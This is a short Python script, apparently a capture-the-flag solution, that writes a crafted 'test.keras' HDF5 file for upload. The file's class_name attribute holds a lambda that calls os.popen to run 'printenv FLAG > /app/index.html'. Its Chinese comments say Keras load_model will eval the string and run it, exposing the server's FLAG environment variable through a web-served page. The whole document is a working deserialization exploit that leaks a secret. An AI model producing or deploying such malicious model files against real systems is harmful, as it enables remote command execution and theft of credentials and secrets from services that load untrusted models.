import keras
from keras.models import load_model
import h5py
import os
import json
flag = os.environ.get('FLAG', 'no_flag')

with h5py.File('test.keras', 'w') as f:
    f.attrs['keras_version'] = '2.3.1'
    f.attrs['backend'] = 'tensorflow'
    
    # 在属性里写恶意代码字符串
    f.attrs['layer_names'] = [b"malicious"]
    g = f.create_group("malicious")
    
    # 这个配置会在load_model时触发eval执行
    # 注意这里写的是字符串，load_model会用eval反序列化
    g.attrs['class_name'] = "lambda: (__import__('os').popen('printenv FLAG > /app/index.html').read())"
    g.attrs['config'] = json.dumps({})

# 之后上传 test.keras 即可
